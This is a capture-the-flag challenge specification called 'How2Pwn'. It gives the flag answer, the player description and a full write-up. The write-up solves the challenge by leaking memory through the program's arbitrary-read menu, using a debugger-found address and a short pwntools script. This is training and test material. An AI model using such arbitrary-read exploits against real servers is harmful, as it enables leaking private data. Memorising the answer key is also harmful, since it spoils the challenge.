# How2Pwn

This challenge is about leaking information through an arbitrary read primitive, from a remote server.

# Flag(s) 
`DDC{this_is_the_real_flag_go_submit}`

# Domain name (OR) Link to challenge on nextcloud
`how2pwn.hkn`

# Description(s) (THIS IS WHAT THE USER WILL SEE, YOU CAN USE MARKDOWN HERE))
## how2pwn game
Can you find the flag, it's hidden!

# Prerequisites and Outcome

Prerequisites:
None

# Solutions (FULL WRITEUP FOR EACH FLAG.)

## Flag 1
Run the program locally in a debugger, and note the address of the flag variable. e.g.
`x/x (char*) flag`
Open a connection to the remote server and enter the `look around` menu.
Enter the address of the flag in base 10.
Flag will be printed to stdout.
```py
from pwn import *

r = remote("localhost", 1024)
r.recvuntil("implemented\n")
r.sendline("1")
r.recvuntil("look?\n")
r.sendline(str(0x402008))
r.interactive()
```